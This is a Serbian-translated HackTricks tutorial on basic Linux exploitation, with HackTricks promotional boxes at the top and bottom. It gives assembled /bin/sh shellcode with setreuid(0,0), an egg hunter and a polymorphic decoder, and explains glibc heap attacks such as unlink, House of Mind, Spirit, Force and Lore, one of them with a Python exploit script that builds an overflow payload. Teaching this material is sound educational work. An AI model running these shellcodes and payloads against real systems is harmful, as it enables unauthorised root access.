# Linux Exploiting (Osnovno)

<details>

<summary><strong>Nauƒçite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naƒçini podr≈°ke HackTricks-u:

* Ako ≈æelite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJSTVO**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniƒçni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), na≈°u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru≈æite se** üí¨ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## **2.SHELLCODE**

Vidi prekide kernela: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep ‚Äú\_\_NR\_‚Äù

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(‚Äú/bin/sh‚Äù, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; ƒçistimo eax\
xor ebx, ebx ; ebx = 0 jer nema argumenata za prosleƒëivanje\
mov al, 0x01 ; eax = 1 ‚Äî> \_\_NR\_exit 1\
int 0x80 ; Izvr≈°iti syscall

**nasm -f elf assembly.asm** ‚Äî> Vraƒáa nam .o datoteku\
**ld assembly.o -o shellcodeout** ‚Äî> Daje nam izvr≈°nu datoteku formiranu od asemblerskog koda i mo≈æemo izvuƒái opkodove sa **objdump**\
**objdump -d -Mintel ./shellcodeout** ‚Äî> Da bismo videli da je zaista na≈° shellcode i izvukli OpKodove

**Proverite da li shellcode funkcioni≈°e**
```
char shellcode[] = ‚Äú\x31\xc0\x31\xdb\xb0\x01\xcd\x80‚Äù

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
Da biste videli da li se sistemski pozivi pravilno izvr≈°avaju, treba da kompajlirate prethodni program i sistemski pozivi treba da se pojave u **strace ./PROGRAMA\_COMPILADO**

Prilikom kreiranja shellcode-a mo≈æete koristiti trik. Prva instrukcija je skok na poziv. Poziv poziva originalni kod i dodatno stavlja EIP na stek. Nakon instrukcije poziva smo ubacili string koji nam je potreban, tako da sa tim EIP-om mo≈æemo pokazati na string i nastaviti izvr≈°avanje koda.

PRIMER **TRICK (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al √∫ltimo call
popl                %esi                                       ; Guardamos en ese la direcci√≥n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=‚Äú/bin/sh‚Äù
leal                 0x8(%esi), %ecx      ; arg[2] = {‚Äú/bin/sh‚Äù, ‚Äú0‚Äù}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(‚Äú/bin/sh‚Äù, [‚Äú/bin/sh‚Äù, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruci√≥n
.string             \‚Äù/bin/sh\‚Äù                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
**Eksplatacija kori≈°ƒáenjem Staka(/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; ‚Äú\0‚Äù
push               dword 0x68732f2f ; ‚Äú//sh‚Äù
push               dword 0x6e69622f; ‚Äú/bin‚Äù
mov                ebx, esp                     ; arg1 = ‚Äú/bin//sh\0‚Äù
push               eax                             ; Null -> args[1]
push               ebx                             ; ‚Äú/bin/sh\0‚Äù -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(‚Äú/bin/sh‚Äù, args[‚Äú/bin/sh‚Äù, ‚ÄúNULL‚Äù], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecut√≥ fabs
‚Ä¶
```
**Lovac na jaja:**

Ovo je mali kod koji prolazi kroz stranice memorije povezane s procesom u potrazi za shellcode-om koji je tamo spremljen (tra≈æi neki potpis postavljen u shellcode-u). Korisno u sluƒçajevima kada imate samo malo prostora za ubacivanje koda.

**Polimorfni shellkodovi**

To su ≈°ifrovani shellkodovi koji imaju male kodove koji ih de≈°ifruju i skoƒçe na njih, koristeƒái trik Call-Pop, ovde je **primer Cezarove ≈°ifre**:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrer√°)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aqu√≠ va el shellcode
```
## **5. Dodatne metode**













###





## **8 Preplavljenje hipa: Osnovni eksploiti**

**Dodeljeni fragment**

prev\_size |\
size | ‚ÄîZaglavlje\
\*mem | Podaci

**Slobodan fragment**

prev\_size |\
size |\
\*fd | Ptr naprednog fragmenta\
\*bk | Ptr nazadnog fragmenta ‚ÄîZaglavlje\
\*mem | Podaci

Slobodni fragmenti su u dvostruko povezanoj listi (bin) i nikada ne mogu biti dva slobodna fragmenta zajedno (spajaju se)

U "size" postoje bitovi koji pokazuju: Da li je prethodni fragment u upotrebi, da li je fragment dodeljen putem mmap() i da li fragment pripada primarnoj areni.

Kada se oslobodi fragment, ako su neki od susednih slobodni, oni se spajaju pomoƒáu makroa unlink() i novi, veƒái fragment se prosleƒëuje frontlink() da ga ubaci u odgovarajuƒái bin.

unlink(){\
BK = P->bk; ‚Äî> BK novog fragmenta je onaj koji je imao prethodno slobodan fragment\
FD = P->fd; ‚Äî> FD novog fragmenta je onaj koji je imao prethodno slobodan fragment\
FD->bk = BK; ‚Äî> BK sledeƒáeg fragmenta pokazuje na novi fragment\
BK->fd = FD; ‚Äî> FD prethodnog fragmenta pokazuje na novi fragment\
}

Dakle, ako uspemo da promenimo P->bk sa adresom shell koda i P->fd sa adresom unosa u GOT ili DTORS manje 12, posti≈æe se:

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

Na taj naƒçin, shell kod se izvr≈°ava prilikom izlaska iz programa.

Takoƒëe, 4. izjava unlink() pi≈°e ne≈°to i shell kod mora biti prilagoƒëen za ovo:

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor\_end\_\_ - 12) ‚Äî> Ovo uzrokuje pisanje 4 bajta od 8. bajta shell koda, pa prva instrukcija shell koda mora biti skok kako bi preskoƒçila ovo i pre≈°la na nops koji vode do ostatka shell koda.

Stoga se eksploit kreira:

U buffer1 ubacujemo shell kod poƒçev≈°i od skoka kako bi pre≈°ao na nops ili ostatak shell koda.

Nakon shell koda ubacujemo punjenje dok ne doƒëemo do polja prev\_size i size sledeƒáeg fragmenta. Na tim mestima ubacujemo 0xfffffff0 (tako da se prev\_size prepisuje da ima bit koji ka≈æe da je slobodan) i "-4" (0xfffffffc) u size (da bi kada proveri u 3. fragmentu da li je 2. bio slobodan, zapravo oti≈°ao na modifikovani prev\_size koji ƒáe reƒái da je slobodan) -> Tako kada free() istra≈æuje, otiƒái ƒáe na size 3. ali zapravo ƒáe otiƒái na 2. - 4 i pomisliƒáe da je 2. fragment slobodan. I tada ƒáe pozvati **unlink()**.

Pozivom unlink() koristi se kao P->fd prvi podaci 2. fragmenta, pa ƒáe se tamo ubaciti adresa koju ≈æelite prepisati - 12 (jer ƒáe u FD->bk dodati 12 adresi saƒçuvanoj u FD). I na toj adresi unosi se druga adresa koja se nalazi u 2. fragmentu, koja ƒáe biti adresa shell koda (la≈æni P->bk).

**from struct import \***

**import os**

**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12 bajtova punjenja**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<I‚Äù, 0xfffffff0) #Bit koji oznaƒçava da je prethodni fragment slobodan treba biti 1**

**fake\_size = pack("\<I‚Äù, 0xfffffffc) #-4, da program misli da je "size" 3. fragmenta 4 bajta unazad (pokazuje na prev\_size) jer tu gleda da li je 2. fragment slobodan**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #Na poƒçetku payloada dodajemo 8 bajtova punjenja**

**got\_free = pack("\<I", 0x08048300 - 12) #Adresa free() u plt-12 (biƒáe adresa koja ƒáe biti prepisana da bi se shell kod pokrenuo drugi put kada se pozove free)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) # Kao ≈°to je reƒçeno, payload poƒçinje sa 8 bajtova punjenja jer da**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #Modifikuje se 2. fragment, got\_free pokazuje gde ƒáemo saƒçuvati adresu addr\_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() oslobaƒëajuƒái u obrnutom redosledu (wargame)**

Kontroli≈°emo 3 uzastopna fragmenta i oslobaƒëamo ih u obrnutom redosledu od rezervisanog.

U tom sluƒçaju:

U fragment c se stavlja shell kod

Fragment a koristimo da prepisujemo b tako da size ima deaktiviran bit PREV\_INUSE tako da misli da je fragment a slobodan.

Takoƒëe, u zaglavlju b se prepisuje size da bude -4.

Tada ƒáe program misliti da je "a" slobodan i u binu, pa ƒáe pozvati unlink() da ga odvoji. Meƒëutim, po≈°to je zaglavlje PREV\_SIZE -4, misliƒáe da fragment "a" zapravo poƒçinje na b+4. Drugim reƒçima, pozvaƒáe unlink() na fragment koji poƒçinje na b+4, pa ƒáe na b+12 biti pokazivaƒç "fd" i na b+16 ƒáe biti pokazivaƒç "bk".

Na taj naƒçin, ako stavimo adresu shell koda u bk i adresu funkcije "puts()" -12 u fd, dobijamo na≈° payload.

**Tehnika Frontlink**

Poziva se frontlink kada se ne≈°to oslobodi i nijedan od susednih fragmenta nije slobodan, ne poziva se unlink() veƒá se direktno poziva frontlink().

Korisna ranjivost kada se napadnuti malloc nikada ne oslobaƒëa (free()).

Potrebno je:

Buffer koji mo≈æe biti preplavljen funkcijom za unos podataka

Buffer koji je susedan ovom koji treba biti osloboƒëen i ƒçije ƒáe se polje fd u zaglavlju promeniti zbog preplavljivanja prethodnog bafera

Buffer koji treba osloboditi sa veliƒçinom veƒáom od 512 ali manjom od prethodnog bafera

Buffer deklarisan pre koraka 3 koji omoguƒáava prepisivanje prev\_size ovog

Na ovaj naƒçin, posti≈æuƒái preplavljivanje u dva malloca na nekontrolisan naƒçin i u jednom kontrolisanom ali koji se oslobaƒëa samo jednom, mo≈æemo napraviti eksploit.

**Ranjivost double free()**

Ako se dva puta pozove free() sa istim pokazivaƒçem, dva bina pokazuju na istu adresu.

U sluƒçaju da se ≈æeli ponovo koristiti jedan, to se mo≈æe uraditi bez problema. U sluƒçaju da se ≈æeli koristiti drugi, dobiƒáe isti prostor, pa ƒáemo imati la≈æirane pokazivaƒçe "fd" i "bk" sa podacima koje ƒáe upisati prethodna rezervacija.

**Nakon free()**

Prethodno osloboƒëeni pokazivaƒç se ponovo koristi bez kontrole.
## **8 Preplavljenje hipa: Napredni eksploiti**

Tehnike Unlink() i FrontLink() su uklonjene modifikacijom funkcije unlink().

**The house of mind**

Samo jedan poziv free() je potreban da bi se izazvalo izvr≈°avanje proizvoljnog koda. Cilj je pronaƒái drugi komad koji mo≈æe biti preplavljen prethodnim i osloboƒëen.

Poziv free() dovodi do poziva public\_fREe(mem), koji radi:

mstate ar\_ptr;

mchunkptr p;

‚Ä¶

p = mem2chunk(mes); ‚Äî> Vraƒáa pokazivaƒç na adresu na kojoj poƒçinje komad (mem-8)

‚Ä¶

ar\_ptr = arena\_for_chunk(p); ‚Äî> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

‚Ä¶

\_int\_free(ar\_ptr, mem);

}

U \[1] se proverava polje size bit NON\_MAIN\_ARENA, koje se mo≈æe promeniti da bi provera vratila taƒçno i izvr≈°ila heap\_for\_ptr() koja vr≈°i and na "mem" ostavljajuƒái 2,5 najmanje bita na 0 (u na≈°em sluƒçaju od 0x0804a000 postaje 0x08000000) i pristupa 0x08000000->ar\_ptr (kao da je struktura heap\_info)

Na ovaj naƒçin, ako mo≈æemo kontrolisati komad na primer na 0x0804a000 i komad ƒáe biti osloboƒëen na **0x081002a0** mo≈æemo stiƒái do adrese 0x08100000 i pisati ≈°ta god ≈æelimo, na primer **0x0804a000**. Kada se ovaj drugi komad oslobodi, heap\_for\_ptr(ptr)->ar\_ptr ƒáe vratiti ono ≈°to smo napisali na 0x08100000 (jer se primenjuje and na 0x081002a0 koji smo videli ranije i odatle se izvlaƒçi vrednost prvih 4 bajta, ar\_ptr)

Na ovaj naƒçin se poziva \_int\_free(ar\_ptr, mem), odnosno, **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
‚Ä¶\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Kao ≈°to smo videli ranije, mo≈æemo kontrolisati vrednost av, jer je to ono ≈°to pi≈°emo u komadu koji ƒáe biti osloboƒëen.

Kako je definisano unsorted\_chunks, znamo da:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Stoga, ako u av->bins\[2] napi≈°emo vrednost \_\_DTOR\_END\_\_-12, u poslednjoj instrukciji ƒáe se upisati u \_\_DTOR\_END\_\_ adresa drugog komada.

Drugim reƒçima, u prvom komadu moramo staviti na poƒçetak mnogo puta adresu \_\_DTOR\_END\_\_-12 jer ƒáe av->bins\[2] to izvuƒái

Na adresi na koju padne adresa drugog komada sa poslednjih 5 nula moramo napisati adresu ovog prvog komada kako bi heap\_for\_ptr() mislio da je ar\_ptr na poƒçetku prvog komada i izvukao av->bins\[2] odande

U drugom komadu i zahvaljujuƒái prvom, prepisujemo prev\_size sa skokom 0x0c i size sa neƒçim ≈°to ƒáe aktivirati -> NON\_MAIN\_ARENA

Zatim u komadu 2 stavljamo puno nops i na kraju shellcode

Na ovaj naƒçin ƒáe se pozvati \_int\_free(KOMAD1, KOMAD2) i pratiti instrukcije za pisanje u \_\_DTOR\_END\_\_ adresu prev\_size KOMAD2 koji ƒáe skoƒçiti na shellcode.

Za primenu ove tehnike potrebno je da se ispune neki dodatni zahtevi koji malo komplikuju payload.

Ova tehnika vi≈°e nije primenjiva jer je primenjen gotovo isti zakrpa kao i za unlink. Uporeƒëuju se da li novi sajt na koji se pokazuje takoƒëe pokazuje na njega.

**Fastbin**

To je varijanta The house of mind

interesuje nas izvr≈°avanje sledeƒáeg koda do kojeg se dolazi nakon prve provere funkcije \_int\_free()

fb = &(av->fastbins\[fastbin\_index(size)] ‚Äî> Gde je fastbin\_index(sz) ‚Äî> (sz >> 3) - 2

‚Ä¶

p->fd = \*fb

\*fb = p

Na ovaj naƒçin, ako se postavi u "fb" adresa funkcije u GOT, na ovoj adresi ƒáe se postaviti adresa prepisanog komada. Za ovo ƒáe biti potrebno da je arena blizu adresa dtors. Taƒçnije, av->max\_fast mora biti na adresi koju ƒáemo prepisati.

S obzirom da smo sa The House of Mind videli da mi kontroli≈°emo poziciju av.

Zato ako u polje size stavimo veliƒçinu 8 + NON\_MAIN\_ARENA + PREV\_INUSE ‚Äî> fastbin\_index() ƒáe vratiti fastbins\[-1], koji ƒáe pokazivati na av->max\_fast

U ovom sluƒçaju av->max\_fast ƒáe biti adresa koja ƒáe biti prepisana (ne na koju pokazuje, veƒá ta pozicija ƒáe biti prepisana).

Takoƒëe, mora se ispuniti uslov da komad koji je susedan osloboƒëenom komadu mora biti veƒái od 8 -> Po≈°to smo rekli da je veliƒçina osloboƒëenog komada 8, u ovom la≈ænom komadu samo treba staviti veliƒçinu veƒáu od 8 (kako ƒáe shellcode biti u osloboƒëenom komadu, treba staviti na poƒçetak skok koji ƒáe pasti na nops).

Takoƒëe, taj isti la≈æni komad mora biti manji od av->system\_mem. av->system\_mem je udaljen 1848 bajtova.

Zbog nula iz \_DTOR\_END\_ i malog broja adresa u GOT, nijedna adresa iz ovih sekcija nije pogodna za prepisivanje, pa pogledajmo kako primeniti fastbin za napad na stek.

Jo≈° jedan naƒçin napada je preusmeravanje **av** ka steku.

Ako promenimo veliƒçinu da bude 16 umesto 8, tada: fastbin\_index() ƒáe vratiti fastbins\[0] i mo≈æemo iskoristiti ovo da prepisujemo stek.

Za ovo ne sme biti nikakvih canary vrednosti ili ƒçudnih vrednosti na steku, zapravo moramo biti u ovom stanju: 4 bajta nula + EBP + RET

4 bajta nula su potrebna da ƒáe **av** biti na ovoj adresi i prvi element **av** je mutex koji mora biti 0.

**av->max\_fast** ƒáe biti EBP i biƒáe vrednost koja ƒáe nam omoguƒáiti da preskoƒçimo ograniƒçenja.

U **av->fastbins\[0]** ƒáe se prepisati adresa **p** i biƒáe RET, tako ƒáe se skoƒçiti na shellcode.

Takoƒëe, u **av->system\_mem** (1484 bajta iznad pozicije na steku) ƒáe biti dosta smeƒáa koje ƒáe nam omoguƒáiti da preskoƒçimo proveru koja se vr≈°i.

Takoƒëe, mora se ispuniti uslov da komad koji je susedan osloboƒëenom komadu mora biti veƒái od 8 -> Po≈°to smo rekli da je veliƒçina osloboƒëenog komada 16, u ovom la≈ænom komadu samo treba staviti veliƒçinu veƒáu od 8 (kako ƒáe shellcode biti u osloboƒëenom komadu, treba staviti na poƒçetak skok koji ƒáe pasti na nops koji dolaze posle polja size novog la≈ænog komada).

**The House of Spirit**

U ovom sluƒçaju tra≈æimo da imamo pokazivaƒç na malloc koji mo≈æe biti promenjen od strane napadaƒça (na primer, da je pokazivaƒç na steku ispod moguƒáeg prelivanja promenljive).

Na taj naƒçin, mogli bismo da nateramo ovaj pokazivaƒç da pokazuje gde god ≈æelimo. Meƒëutim, ne svako mesto je validno, veliƒçina la≈ænog komada mora biti manja od av->max\_fast i taƒçnije jednaka veliƒçini koja ƒáe biti tra≈æena u buduƒáem pozivu malloc()+8. Zbog toga, ako znamo da ƒáe nakon ovog ranjivog pokazivaƒça biti pozvan malloc(40), veliƒçina la≈ænog komada mora biti jednaka 48.
Ako na primer program pita korisnika za broj, mo≈æemo uneti 48 i usmeriti promenljivi pokazivaƒç malloc-a na sledeƒáih 4 bajta (koji bi mogli pripadati EBP-u sreƒáom, tako da 48 ostaje iza, kao da je veliƒçina zaglavlja). Takoƒëe, adresa ptr-4+48 mora zadovoljiti nekoliko uslova (u ovom sluƒçaju ptr=EBP), tj. 8 < ptr-4+48 < av->system\_mem.

Ako se ovo ostvari, kada se pozove sledeƒái malloc koji smo rekli da je malloc(40), biƒáe dodeljena adresa EBP-u. Ako napadaƒç takoƒëe mo≈æe kontrolisati ≈°ta se pi≈°e u ovom malloc-u, mo≈æe prebrisati kako EBP tako i EIP sa ≈æeljenom adresom.

Ovo je zato ≈°to kada se oslobodi free(), ƒçuvaƒáe se da u adresi koja pokazuje na EBP steka postoji deo taƒçno veliƒçine za novi malloc() koji se ≈æeli rezervisati, pa ƒáe mu dodeliti tu adresu.

**The House of Force**

Potrebno je:

* Prekoraƒçenje u delu koji omoguƒáava prebrisavanje wilderness-a
* Poziv malloc() sa veliƒçinom definisanom od strane korisnika
* Poziv malloc() ƒçiji podaci mogu biti definisani od strane korisnika

Prvo ≈°to se radi je prebrisavanje veliƒçine dela wilderness sa veoma velikom vredno≈°ƒáu (0xffffffff), tako da ƒáe svaki zahtev za memorijom dovoljno velik biti obraƒëen u \_int\_malloc() bez potrebe za pro≈°irivanjem hipa.

Drugo je promeniti av->top tako da pokazuje na deo memorije pod kontrolom napadaƒça, kao ≈°to je stek. U av->top ƒáe se staviti \&EIP - 8.

Moramo prebrisati av->top kako bi pokazivao na deo memorije pod kontrolom napadaƒça:

victim = av->top;

remainder = chunck\_at\_offset(victim, nb);

av->top = remainder;

Victim uzima vrednost trenutne adrese wilderness dela (trenutni av->top) i remainder je taƒçno ta adresa plus broj bajtova tra≈æenih od strane malloc(). Dakle, ako je \&EIP-8 na 0xbffff224 i av->top sadr≈æi 0x080c2788, tada je potrebno rezervisati u kontrolisanom mallocu toliko bajtova da av->top pokazuje na $EIP-8 za sledeƒái malloc():

0xbffff224 - 0x080c2788 = 3086207644.

Na taj naƒçin ƒáe se saƒçuvati promenjena vrednost u av->top i sledeƒái malloc ƒáe pokazivati na EIP i moƒái ƒáe ga prebrisati.

Va≈æno je znati da veliƒçina novog dela wilderness bude veƒáa od zahteva poslednjeg malloc(). Drugim reƒçima, ako wilderness pokazuje na \&EIP-8, veliƒçina ƒáe biti taƒçno na EBP polju steka.

**The House of Lore**

**Korupcija SmallBin**

Oslobaƒëeni delovi se ubacuju u bin u zavisnosti od njihove veliƒçine. Ali pre nego ≈°to se ubace, ƒçuvaju se u unsorted bins. Kada se deo oslobodi, ne stavlja se odmah u svoj bin veƒá ostaje u unsorted bins. Zatim, ako se rezervi≈°e novi deo i prethodni oslobaƒëeni mo≈æe poslu≈æiti, vraƒáa se, ali ako se rezervi≈°e veƒái deo, oslobaƒëeni deo u unsorted bins se stavlja u odgovarajuƒái bin.

Da bi se do≈°lo do ranjivog koda, zahtev za memorijom mora biti veƒái od av->max\_fast (obiƒçno 72) i manji od MIN\_LARGE\_SIZE (512).

Ako u binu postoji deo odgovarajuƒáe veliƒçine zahtevanog dela, on se vraƒáa nakon ≈°to se odve≈æe:

bck = victim->bk; Pokazuje na prethodni deo, jedina informacija koju mo≈æemo promeniti.

bin->bk = bck; Pretposlednji deo postaje poslednji, ako bck pokazuje na stek, sledeƒáem rezervisanom delu ƒáe se dati ta adresa

bck->fd = bin; Zatvara se lista tako ≈°to pokazuje na bin

Potrebno je:

Rezervisati dva malloc-a, tako da se prvom mo≈æe prekoraƒçiti nakon ≈°to je drugi osloboƒëen i ubaƒçen u svoj bin (tj. rezervisan je veƒái malloc od drugog dela pre prekoraƒçenja)

Malloc rezervisan sa adresom koju bira napadaƒç mora biti pod kontrolom napadaƒça.

Cilj je sledeƒái, ako mo≈æemo prekoraƒçiti hip koji ispod ima veƒá osloboƒëen deo u svom binu, mo≈æemo promeniti njegov pokazivaƒç bk. Ako promenimo njegov pokazivaƒç bk i taj deo postane prvi u listi bina i rezervisan je, bin ƒáe biti prevaren i reƒái ƒáe mu da je poslednji deo liste (sledeƒái za ponudom) na la≈ænoj adresi koju smo postavili (na steku ili GOT na primer). Dakle, ako se rezervi≈°e jo≈° jedan deo i napadaƒç ima dozvolu na njemu, dobiƒáe deo na ≈æeljenoj poziciji i moƒái ƒáe da pi≈°e u njega.

Nakon oslobaƒëanja promenjenog dela, potrebno je rezervisati deo veƒái od osloboƒëenog, tako da promenjeni deo izaƒëe iz unsorted bins i ubaci se u svoj bin.

Kada se naƒëe u svom binu, vreme je da se promeni pokazivaƒç bk preko prekoraƒçenja kako bi pokazivao na ≈æeljenu adresu.

Tako bin mora da saƒçeka dovoljno poziva malloc() da se ponovo koristi promenjeni bin i prevari bin tako ≈°to ƒáe mu reƒái da je sledeƒái deo na la≈ænoj adresi. Zatim ƒáe dobiti deo koji nas zanima.

Da bi se iskoristila ranjivost ≈°to je pre moguƒáe, idealno bi bilo: Rezervacija ranjivog dela, rezervacija dela koji ƒáe se promeniti, oslobaƒëanje tog dela, rezervacija dela veƒáeg od dela koji ƒáe se promeniti, promena dela (ranjivost), rezervacija dela iste veliƒçine kao ranjeno i rezervacija drugog dela iste veliƒçine koji ƒáe pokazivati na odabranu adresu.

Da bi se za≈°titio ovaj napad, koristi se tipiƒçna provera da deo "nije" la≈æan: proverava se da li bck->fd pokazuje na victim. Drugim reƒçima, u na≈°em sluƒçaju, ako pokazivaƒç fd\* la≈ænog dela pokazuje na victim na steku. Da bi se prevazi≈°la ova za≈°tita, napadaƒç mora biti sposoban da na neki naƒçin (verovatno preko steka) upi≈°e u odgovarajuƒáu adresu adresu victim. Tako ƒáe izgledati kao pravi deo.

**Korupcija LargeBin**

Potrebni su isti zahtevi kao i pre i jo≈° neki, osim toga, rezervisani delovi moraju biti veƒái od 512.

Napad je sliƒçan prethodnom, tj. treba promeniti pokazivaƒç bk i potrebne su sve te pozive malloc(), ali takoƒëe treba promeniti veliƒçinu promenjenog dela tako da ta veliƒçina - nb bude < MINSIZE.

Na primer, postaviƒáemo veliƒçinu na 1552 tako da 1552 - 1544 = 8 < MINSIZE (oduzimanje ne mo≈æe biti negativno jer se uporeƒëuje sa unsigned)

Takoƒëe je uveden zakrpa da bi se to uƒçinilo jo≈° slo≈æenijim.

**Heap Spraying**

Osnovna ideja je rezervisati ≈°to vi≈°e memorije za hipove i popuniti ih nizom nops-a zavr≈°enim shellcode-om. Takoƒëe, kao jastuk se koristi 0x0c. Poku≈°aƒáemo da skoƒçimo na adresu 0x0c0c0c0c, pa ako se neka adresa prepi≈°e sa ovim jastukom, skoƒçiƒáe tamo. Osnovna taktika je rezervisati ≈°to je vi≈°e moguƒáe da vidimo da li se neki pokazivaƒç prepi≈°e i skoƒçiti na 0x0c0c0c0c u nadi da tamo postoje nops.

**Heap Feng Shui**

Sastoji se od rezervacija i oslobaƒëanja memorije kako bi se segmentirala memorija tako da izmeƒëu slobodnih delova ostanu rezervisani delovi. Bafer za prekoraƒçenje ƒáe se nalaziti u jednom od tih delova.
**objdump -t ./exec | grep varBss** ‚Äî> Tabela simbola, za izvlaƒçenje adrese promenljivih i funkcija\
**objdump -TR ./exec | grep exit(func lib)** ‚Äî> Za izvlaƒçenje adrese funkcija iz biblioteka (GOT)\
**objdump -d ./exec | grep funcCode**\
**objdump -s -j .dtors /exec**\
**objdump -s -j .got ./exec**\
**objdump -t --dynamic-relo ./exec | grep puts** ‚Äî> Izvlaƒçi adresu puts za prepisivanje u GOT\
**objdump -D ./exec** ‚Äî> Disas ALL do ulaza plt\
**objdump -p -/exec**\
**Info functions strncmp ‚Äî>** Info o funkciji u gdb

## Interesantni kursevi

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)
* [https://ir0nstone.gitbook.io/notes](https://ir0nstone.gitbook.io/notes)
* [https://github.com/shellphish/how2heap](https://github.com/shellphish/how2heap)
* [https://pwnable.tw/](https://pwnable.tw/)
* [https://ctf.hackucf.org/](https://ctf.hackucf.org/)

## **Reference**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

<details>

<summary><strong>Nauƒçite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naƒçini podr≈°ke HackTricks-u:

* Ako ≈æelite da vidite **va≈°u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniƒçni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na≈°u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru≈æite se** üí¨ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
